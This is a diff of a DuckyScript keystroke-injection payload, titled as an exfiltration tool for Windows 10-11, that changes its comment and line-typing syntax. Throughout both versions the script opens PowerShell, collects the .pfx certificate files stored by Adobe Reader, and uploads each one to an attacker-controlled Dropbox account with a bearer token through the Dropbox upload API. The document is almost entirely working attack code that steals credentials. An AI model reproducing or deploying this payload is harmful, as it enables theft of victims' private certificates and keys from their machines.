@@ -1,21 +1,17 @@
-REM ####################################################################
-REM #                                                                  |
-REM # Title        : Export all saved certificates with Adobe Reader   |
-REM # Author       : Aleff                                             |
-REM # Version      : 1.0                                               |
-REM # Category     : Exfiltration                                      |
-REM # Target       : Windows 10-11                                     |
-REM #                                                                  |
-REM ####################################################################
+* ####################################################################
+* #                                                                  |
+* # Title        : Export all saved certificates with Adobe Reader   |
+* # Author       : Aleff                                             |
+* # Version      : 1.0                                               |
+* # Category     : Exfiltration                                      |
+* # Target       : Windows 10-11                                     |
+* #                                                                  |
+* ####################################################################
 
 
-REM Requirements:
-REM     - Adobe Reader must be installed
-REM     - Internet Connection
-
-
-REM You must define your Dropbox accessToken or modify the exfiltration modality.
-DEFINE DROPBOX_ACCESS_TOKEN example
+* Requirements:
+*     - Adobe Reader must be installed
+*     - Internet Connection
 
 
 GUI r
@@ -23,33 +19,38 @@ DELAY 1000
 STRING PowerShell
 DELAY 2000
 
-REM Settings about Adobe Reader
-STRINGLN
-    $roamingFolderPath = [Environment]::GetFolderPath('ApplicationData')
-    $securityFolderPath = Join-Path -Path $roamingFolderPath -ChildPath 'Adobe\Acrobat\DC\Security'
-    $pfxFiles = Get-ChildItem -Path $securityFolderPath -Filter '*.pfx' -File
-END_STRINGLN
-
-REM Setting about exfiltration
-STRING $accessToken = "
-STRING DROPBOX_ACCESS_TOKEN
-STRING "
+* Settings about Adobe Reader
+STRING $roamingFolderPath = [Environment]::GetFolderPath('ApplicationData')
+ENTER
+STRING $securityFolderPath = Join-Path -Path $roamingFolderPath -ChildPath 'Adobe\Acrobat\DC\Security'
+ENTER
+STRING $pfxFiles = Get-ChildItem -Path $securityFolderPath -Filter '*.pfx' -File
 ENTER
 
-STRINGLN
-    $authHeader = @{Authorization = "Bearer $accessToken"}
+* You must define your Dropbox accessToken or modify the exfiltration modality.
+STRING $accessToken = "DROPBOX_ACCESS_TOKEN"
+ENTER
 
-    $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
+STRING $authHeader = @{Authorization = "Bearer $accessToken"}
 
-    foreach ($file in $pfxFiles) {
-        $dropboxFilePath = "/$file"
-        $headers = @{}
-        $headers.Add("Authorization", "Bearer $accessToken")
-        $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
-        $headers.Add("Content-Type", "application/octet-stream")
+ENTER
+STRING $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
 
-        Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $file
-    }
+ENTER
+STRING foreach ($file in $pfxFiles) {
+ENTER
+STRING $dropboxFilePath = "/$file"
+ENTER
+STRING $headers = @{}
+ENTER
+STRING $headers.Add("Authorization", "Bearer $accessToken")
+ENTER
+STRING $headers.Add("Dropbox-API-Arg", '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}')
+ENTER
+STRING $headers.Add("Content-Type", "application/octet-stream")
 
-    exit    
-END_STRINGLN
+ENTER
+STRING Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $file
+ENTER
+STRING }; exit
+ENTER
